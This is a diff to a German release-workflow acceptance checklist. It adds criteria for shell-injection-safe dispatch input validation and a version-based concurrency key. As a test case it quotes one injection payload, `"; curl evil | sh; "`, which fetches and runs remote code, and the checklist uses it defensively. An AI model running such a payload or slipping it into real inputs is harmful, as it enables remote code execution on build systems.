@@ -96,6 +96,26 @@ oder spaeterer):
     aus. Damit zeigen Image-Build, Asset-Erzeugung und
     Release-Notes-Generierung auf denselben Commit —
     egal ob via Tag-Push oder Manual-Dispatch.
+  - **workflow_dispatch-Input ist Shell-Injection-sicher**
+    (Review-Folge-4-F1-Korrektur). Pruefung mit
+    bewusst-boesem Dispatch-Input (z. B. `"; curl evil |
+    sh; "`): der `Resolve refs`-Step MUSS mit
+    `::error::Invalid version input: ...`-Output fehl-
+    schlagen, BEVOR irgendein Image-Build oder Push
+    ausgefuehrt wird. Validierung gegen striktes SemVer-
+    Tag-Regex; Input per `env`-Variable (NICHT direkte
+    `${{ ... }}`-Shell-Interpolation). Verbotene
+    Alternative: jegliche Re-Einfuehrung von
+    `VERSION="${{ inputs.version }}"` direkt im `run:`-
+    Block.
+  - **Concurrency-Key basiert auf Version, nicht
+    `github.ref`** (Review-Folge-4-F3-Korrektur). Pruefung:
+    paralleler Tag-Push + Manual-Dispatch fuer dieselbe
+    Version `v0.1.0` darf **nicht** parallel laufen
+    (gleicher `concurrency.group`). `group: release-${{
+    github.event.inputs.version || github.ref_name }}`
+    resolved zur tatsaechlich-zu-veroeffentlichenden
+    Version.
 - **Slice-Doc**:
   - `done/M6-welle-2.md §9 DoD` Box „Reale Workflow-Run-
     Verifikation" auf `[x]` mit Sensor-Run-Hash + Run-ID-
